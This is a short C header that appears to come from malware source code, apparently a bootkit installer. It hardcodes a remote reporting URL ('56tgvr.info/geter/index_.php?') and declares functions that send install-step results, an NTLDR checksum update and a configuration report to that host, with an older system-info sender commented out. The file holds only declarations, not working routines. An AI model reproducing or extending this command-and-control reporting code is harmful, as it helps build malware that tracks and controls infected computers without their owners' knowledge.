#ifndef DBGRPT_H
#define DBGRPT_H

#include <windows.h>

#define PP_REPORT_HOST "56tgvr.info"
#define PP_REPORT_PATH "/geter/index_.php?"
#define PP_REPORT_URL  "http://" PP_REPORT_HOST PP_REPORT_PATH

//#define PP_DBGRPT_FUNCTION_CALL(function) __noop

#define DBGRPT_ENABLED

#ifdef DBGRPT_ENABLED
#	define PP_DBGRPT_FUNCTION_CALL(function) { (function); };
#else 
#	define PP_DBGRPT_FUNCTION_CALL(function) __noop
#endif

void DebugReportStep1();
void DebugReportStep2(DWORD BkInstallResult);
//void DebugReportStep3();
//void DebugReportStep5();
//void DebugReportStep6();
void DebugReportStepByName(const char* StepName);
void DebugReportUpdateNtldrCheckSum();
//
//void DebugReportSendSysInfo(PCHAR uid, PCHAR path);
void DebugReportCreateConfigReportAndSend();

#endif //DBGRPT_H
